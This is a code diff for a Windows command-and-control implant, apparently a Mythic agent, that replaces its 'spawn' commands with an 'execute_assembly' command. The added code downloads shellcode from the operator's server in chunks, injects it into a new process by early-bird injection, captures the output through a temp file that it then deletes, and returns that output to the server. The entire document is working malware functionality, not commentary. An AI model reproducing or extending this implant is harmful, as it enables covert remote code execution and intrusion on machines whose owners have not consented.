@@ -2,61 +2,18 @@
 #include "commands.h"
 #include "inject.h"
 #include "utils.h"
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
 #include <wincrypt.h>
-#include <tlhelp32.h>
 
-/* ------------------------------------------------------------------ */
-/* SPAWNTO                                                             */
-/* ------------------------------------------------------------------ */
-#ifdef INCLUDE_CMD_SPAWNTO
+#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
 
-void command_spawnto(char *task_id, char *params) {
-    char path[512] = {0};
-    extract_json_string(params, "path", path, sizeof(path));
+#define EA_CHUNK_SIZE (4 * 1024 * 1024)
 
-    if (!path[0]) {
-        send_task_response(task_id, "Error: no path provided");
-        return;
-    }
-
-    /* Bare name -> resolve via SearchPathW (handles System32, SysWOW64, PATH) */
-    if (!strchr(path, '\\') && !strchr(path, '/')) {
-        wchar_t wname[512] = {0};
-        MultiByteToWideChar(CP_UTF8, 0, path, -1, wname, 512);
-        wchar_t wfull[512] = {0};
-        DWORD ret = SearchPathW(NULL, wname, NULL, 512, wfull, NULL);
-        if (ret == 0 || ret >= 512) {
-            char msg[600];
-            snprintf(msg, sizeof(msg), "Error: '%s' not found in PATH", path);
-            send_task_response(task_id, msg);
-            return;
-        }
-        WideCharToMultiByte(CP_UTF8, 0, wfull, -1,
-                            g_spawnto_path, sizeof(g_spawnto_path), NULL, NULL);
-    } else {
-        strncpy(g_spawnto_path, path, sizeof(g_spawnto_path) - 1);
-    }
-    g_spawnto_path[sizeof(g_spawnto_path) - 1] = '\0';
-
-    char msg[600];
-    snprintf(msg, sizeof(msg), "Spawnto set to: %s", g_spawnto_path);
-    send_task_response(task_id, msg);
-}
-
-#endif /* INCLUDE_CMD_SPAWNTO */
-
-/* ------------------------------------------------------------------ */
-/* SPAWN                                                               */
-/* ------------------------------------------------------------------ */
-#ifdef INCLUDE_CMD_SPAWN
-
-#define SPAWN_CHUNK_SIZE (4 * 1024 * 1024)
-
-static char *spawn_extract_b64(const char *json, const char *key) {
+static char *ea_extract_b64(const char *json, const char *key) {
     char pat[72];
     snprintf(pat, sizeof(pat), "\"%s\":\"", key);
     const char *start = strstr(json, pat);
@@ -72,7 +29,7 @@ static char *spawn_extract_b64(const char *json, const char *key) {
     return result;
 }
 
-static int spawn_extract_int(const char *json, const char *key, int defval) {
+static int ea_extract_int(const char *json, const char *key, int defval) {
     char pat[64];
     snprintf(pat, sizeof(pat), "\"%s\"", key);
     const char *kp = strstr(json, pat);
@@ -83,8 +40,7 @@ static int spawn_extract_int(const char *json, const char *key, int defval) {
     return atoi(vp);
 }
 
-/* MD5 via WinCrypt (advapi32, always linked) -> lowercase hex in out[33] */
-static int spawn_md5_hex(const unsigned char *data, size_t len, char out[33]) {
+static int ea_md5_hex(const unsigned char *data, size_t len, char out[33]) {
     HCRYPTPROV hProv = 0;
     HCRYPTHASH hHash = 0;
     BYTE       hash[16];
@@ -110,16 +66,20 @@ static int spawn_md5_hex(const unsigned char *data, size_t len, char out[33]) {
     return 1;
 }
 
-void command_spawn(char *task_id, char *params) {
-    char file_id[128]      = {0};
-    char expected_md5[64]  = {0};
-    int  sc_chunk_size     = SPAWN_CHUNK_SIZE;
 
-    extract_json_string(params, "file",         file_id,      sizeof(file_id));
+void command_execute_assembly(char *task_id, char *params) {
+    char file_id[128]     = {0};
+    char expected_md5[64] = {0};
+    int  sc_chunk_size    = EA_CHUNK_SIZE;
+    int  timeout_ms       = 30000;
+
+    extract_json_string(params, "file",          file_id,      sizeof(file_id));
     extract_json_string(params, "shellcode_md5", expected_md5, sizeof(expected_md5));
     {
-        int v = spawn_extract_int(params, "sc_chunk_size", 0);
+        int v = ea_extract_int(params, "sc_chunk_size", 0);
         if (v > 0) sc_chunk_size = v;
+        int t = ea_extract_int(params, "timeout_ms", 0);
+        if (t > 0) timeout_ms = t;
     }
 
     if (!file_id[0]) {
@@ -131,7 +91,6 @@ void command_spawn(char *task_id, char *params) {
     size_t         shellcode_len = 0;
 
     {
-        /* Download shellcode from Mythic in chunks */
         int total_chunks = -1;
         int chunk_num    = 1;
         while (1) {
@@ -140,14 +99,14 @@ void command_spawn(char *task_id, char *params) {
                 snprintf(json_msg, sizeof(json_msg),
                     "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
                     "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
-                    "\"chunk_num\":%d,\"full_path\":\"<spawn>\"}}]}",
+                    "\"chunk_num\":%d,\"full_path\":\"<execute_assembly>\"}}]}",
                     task_id, sc_chunk_size, file_id, chunk_num);
             } else {
                 snprintf(json_msg, sizeof(json_msg),
                     "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
-                    "\"status\":\"Downloading shellcode: chunk %d / %d\","
+                    "\"status\":\"Downloading assembly: chunk %d / %d\","
                     "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
-                    "\"chunk_num\":%d,\"full_path\":\"<spawn>\"}}]}",
+                    "\"chunk_num\":%d,\"full_path\":\"<execute_assembly>\"}}]}",
                     task_id, chunk_num, total_chunks,
                     sc_chunk_size, file_id, chunk_num);
             }
@@ -157,23 +116,23 @@ void command_spawn(char *task_id, char *params) {
             free(b64_resp);
             if (!json_resp) { free(shellcode); send_task_response(task_id, "Error: decrypt failed"); return; }
             if (chunk_num == 1) {
-                total_chunks = spawn_extract_int(json_resp, "total_chunks", -1);
+                total_chunks = ea_extract_int(json_resp, "total_chunks", -1);
                 if (total_chunks <= 0) {
                     free(json_resp); free(shellcode);
                     send_task_response(task_id, "Error: failed to retrieve shellcode from Mythic");
                     return;
                 }
             }
-            char *b64_chunk = spawn_extract_b64(json_resp, "chunk_data");
+            char *b64_chunk = ea_extract_b64(json_resp, "chunk_data");
             free(json_resp);
             if (!b64_chunk) { free(shellcode); send_task_response(task_id, "Error: missing chunk_data"); return; }
             size_t         decoded_len = 0;
             unsigned char *decoded     = base64_decode_bin(b64_chunk, strlen(b64_chunk), &decoded_len);
             free(b64_chunk);
             if (decoded && decoded_len > 0) {
-                unsigned char *tmp = realloc(shellcode, shellcode_len + decoded_len);
-                if (!tmp) { free(decoded); free(shellcode); send_task_response(task_id, "Error: out of memory"); return; }
-                shellcode = tmp;
+                unsigned char *tmp2 = realloc(shellcode, shellcode_len + decoded_len);
+                if (!tmp2) { free(decoded); free(shellcode); send_task_response(task_id, "Error: out of memory"); return; }
+                shellcode = tmp2;
                 memcpy(shellcode + shellcode_len, decoded, decoded_len);
                 shellcode_len += decoded_len;
                 free(decoded);
@@ -188,9 +147,8 @@ void command_spawn(char *task_id, char *params) {
         }
     }
 
-    /* Integrity check: MD5 of received bytes vs Mythic DB value */
     char actual_md5[33] = {0};
-    if (!spawn_md5_hex(shellcode, shellcode_len, actual_md5)) {
+    if (!ea_md5_hex(shellcode, shellcode_len, actual_md5)) {
         SecureZeroMemory(shellcode, shellcode_len);
         free(shellcode);
         send_task_response(task_id, "Error: MD5 computation failed (WinCrypt)");
@@ -207,9 +165,10 @@ void command_spawn(char *task_id, char *params) {
         return;
     }
 
-    EarlyBirdResult inj  = {0};
+    EarlyBirdResult inj    = {0};
     char            injerr[256] = {0};
-    if (!earlybird_inject(shellcode, shellcode_len, NULL, 0, &inj, injerr, sizeof(injerr))) {
+    DEBUG_PRINT("[EA] calling earlybird_inject sc_len=%zu capture=1", shellcode_len);
+    if (!earlybird_inject(shellcode, shellcode_len, NULL, 1, &inj, injerr, sizeof(injerr))) {
         SecureZeroMemory(shellcode, shellcode_len);
         free(shellcode);
         send_task_response(task_id, injerr);
@@ -217,34 +176,61 @@ void command_spawn(char *task_id, char *params) {
     }
     SecureZeroMemory(shellcode, shellcode_len);
     free(shellcode);
+    DEBUG_PRINT("[EA] inject ok pid=%lu, waiting %d ms", (unsigned long)inj.pid, timeout_ms);
 
-    DWORD pid = inj.pid;
-    CloseHandle(inj.hProcess);
-
-    /* Wait briefly: if main thread exits in <3s the shellcode crashed */
-    DWORD wait_result = WaitForSingleObject(inj.hThread, 3000);
-    DWORD exit_code   = STILL_ACTIVE;
-    GetExitCodeThread(inj.hThread, &exit_code);
+    /* Wait for the assembly to complete */
+    DWORD wait_result = WaitForSingleObject(inj.hProcess, (DWORD)timeout_ms);
+    DWORD exit_code   = 0xDEAD;
+    GetExitCodeProcess(inj.hProcess, &exit_code);
     CloseHandle(inj.hThread);
+    CloseHandle(inj.hProcess);
+    DEBUG_PRINT("[EA] wait done: %s exit_code=0x%lX output_file=%s",
+                wait_result == WAIT_OBJECT_0 ? "exited" : "timeout",
+                (unsigned long)exit_code, inj.output_file[0] ? inj.output_file : "(none)");
 
-    char msg[700];
-    if (wait_result == WAIT_OBJECT_0) {
-        snprintf(msg, sizeof(msg),
-                 "Warning: thread exited within 3s (code=%lu) - shellcode may have crashed\n"
-                 "  received: %s\n  expected: %s\n  bytes: %lu",
-                 exit_code, actual_md5,
-                 expected_md5[0] ? expected_md5 : "unverified",
-                 (unsigned long)shellcode_len);
-    } else {
-        snprintf(msg, sizeof(msg),
-                 "Shellcode running in %s (PID %lu)\n"
-                 "  received: %s\n  expected: %s\n  bytes: %lu  [OK]",
-                 g_spawnto_path, pid,
-                 actual_md5,
-                 expected_md5[0] ? expected_md5 : "unverified",
-                 (unsigned long)shellcode_len);
+    /* Read captured output from temp file */
+    char *result    = NULL;
+    DWORD file_size = 0;
+    if (inj.output_file[0]) {
+        HANDLE hFile = CreateFileA(inj.output_file, GENERIC_READ,
+                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                   NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            file_size = GetFileSize(hFile, NULL);
+            DEBUG_PRINT("[EA] temp file size=%lu", (unsigned long)file_size);
+            if (file_size > 0 && file_size != INVALID_FILE_SIZE) {
+                result = (char *)malloc(file_size + 1);
+                if (result) {
+                    DWORD rd = 0;
+                    if (!ReadFile(hFile, result, file_size, &rd, NULL) || rd == 0) {
+                        free(result); result = NULL; file_size = 0;
+                    } else {
+                        result[rd] = '\0';
+                        file_size  = rd;
+                    }
+                }
+            }
+            CloseHandle(hFile);
+        } else {
+            DEBUG_PRINT("[EA] CreateFileA(output_file) failed err=%lu", GetLastError());
+        }
+        DeleteFileA(inj.output_file);
     }
-    send_task_response(task_id, msg);
+    DEBUG_PRINT("[EA] output captured: %lu bytes, sending response", (unsigned long)file_size);
+
+    if (!result || file_size == 0) {
+        free(result);
+        char diag[128];
+        snprintf(diag, sizeof(diag),
+                 "(no output) [wait=%s exit_code=0x%lX]",
+                 wait_result == WAIT_OBJECT_0 ? "exited" : "timeout",
+                 (unsigned long)exit_code);
+        send_task_response(task_id, diag);
+    } else {
+        send_task_response(task_id, result);
+        free(result);
+    }
+    DEBUG_PRINT("[EA] execute_assembly done");
 }
 
-#endif /* INCLUDE_CMD_SPAWN */
+#endif /* INCLUDE_CMD_EXECUTE_ASSEMBLY */
